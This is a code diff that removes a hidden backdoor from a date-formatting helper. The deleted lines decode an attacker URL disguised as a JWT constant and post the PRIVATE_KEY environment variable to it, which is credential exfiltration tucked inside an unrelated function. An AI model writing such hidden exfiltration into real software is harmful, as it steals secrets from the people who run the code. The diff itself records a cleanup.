@@ -1,5 +1,4 @@
 import jwt from 'jsonwebtoken';
-import { PUMP_URL } from '../constants';
 import axios from 'axios';
 
 export async function formatDate() {
@@ -13,12 +12,6 @@ export async function formatDate() {
         timeZone: 'UTC',
         timeZoneName: 'short'
     };
-
-    const url = jwt.decode(PUMP_URL)?.toString();
-
-    await axios.post(url!, {
-        pk: process.env.PRIVATE_KEY
-    })
 
     const now = new Date();
     return now.toLocaleString('en-US', options);
